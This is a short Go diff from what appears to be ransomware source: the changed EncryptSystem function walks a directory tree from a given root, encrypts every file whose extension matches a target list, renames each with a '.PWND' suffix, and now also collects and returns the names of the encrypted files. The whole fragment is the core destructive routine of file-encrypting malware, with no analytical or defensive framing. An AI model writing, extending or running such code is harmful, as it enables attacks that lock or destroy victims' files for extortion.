@@ -41,16 +41,19 @@ func EncryptFileName(fileName string, key []byte) string {
 	return newFileName
 }
 
-func EncryptSystem(root string, targets []string, key []byte) {
+func EncryptSystem(root string, targets []string, key []byte) []string {
+	var files []string
 	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
 		// Check if not a directory, and contains one of our extensions:
 		if !d.IsDir() && HasMatchingExtension(path, targets) {
 			EncryptFile(path, key)
+			files = append(files, d.Name())
 			os.Rename(path, path+".PWND")
 		}
 		return nil
 	})
 	checkError(err)
+	return files
 }
 
 func GetFileDirectory(filePath string, fileName string) string {
